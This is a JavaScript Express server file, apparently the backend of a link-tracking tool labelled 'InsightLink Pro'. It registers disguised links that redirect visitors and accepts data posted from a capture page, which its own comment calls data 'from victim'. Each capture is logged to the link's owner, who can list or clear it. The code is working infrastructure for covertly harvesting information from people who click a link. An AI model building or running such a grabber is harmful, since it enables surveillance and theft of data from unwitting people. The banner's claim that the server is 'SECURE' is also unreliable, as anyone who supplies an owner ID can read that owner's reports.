
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory database (Resets on server restart)
let reports = [];
let registeredLinks = []; // Maps linkId to { ownerId, redirectUrl }

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'dist')));

// API to register a link (Called by Dashboard)
app.post('/api/register-link', (req, res) => {
  const { id, ownerId, redirectUrl, name } = req.body;
  if (!id || !ownerId || !redirectUrl) {
    return res.status(400).json({ error: 'Missing link parameters' });
  }
  
  // Store the link registration
  registeredLinks.push({ id, ownerId, redirectUrl, name, createdAt: new Date().toISOString() });
  console.log(`[LINK] Node Registered: ${id} for Owner: ${ownerId}`);
  res.status(200).json({ status: 'success' });
});

// API to get link info (Called by CapturePage)
// This allows the CapturePage to know where to redirect without having the ownerId in the URL
app.get('/api/link-info/:id', (req, res) => {
  const link = registeredLinks.find(l => l.id === req.params.id);
  if (!link) return res.status(404).json({ error: 'Link not found' });
  res.json({ redirectUrl: link.redirectUrl });
});

// API to receive data from victim
app.post('/api/reports/:linkId', (req, res) => {
  const { linkId } = req.params;
  const reportData = req.body;
  
  // Find the ownerId associated with this linkId from our server-side registry
  const linkRecord = registeredLinks.find(l => l.id === linkId);
  const ownerId = linkRecord ? linkRecord.ownerId : 'ANONYMOUS';

  const newReport = { 
    ...reportData, 
    linkId,
    ownerId, // Tag with server-resolved ownerId
    receivedAt: new Date().toISOString() 
  };
  
  reports.unshift(newReport); 
  console.log(`[INTEL] Capture logged for Node: ${linkId} | Assigned to Owner: ${ownerId}`);
  res.status(200).json({ status: 'success' });
});

// API to get reports scoped to an owner
app.get('/api/all-reports', (req, res) => {
  const { ownerId } = req.query;
  if (!ownerId) return res.status(400).json({ error: 'Owner ID required' });

  const filtered = reports.filter(r => r.ownerId === ownerId);
  res.json(filtered);
});

// Clear reports for a specific owner
app.delete('/api/reports', (req, res) => {
  const { ownerId } = req.query;
  if (!ownerId) return res.status(400).send('Owner ID required');
  reports = reports.filter(r => r.ownerId !== ownerId);
  res.status(200).send('Cleared');
});

// Handle React Routing
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`
  =========================================
  INSIGHTLINK PRO SERVER v4.0 (SECURE)
  Privacy Logic: SERVER-SIDE MAPPING
  Port: ${PORT}
  =========================================
  `);
});
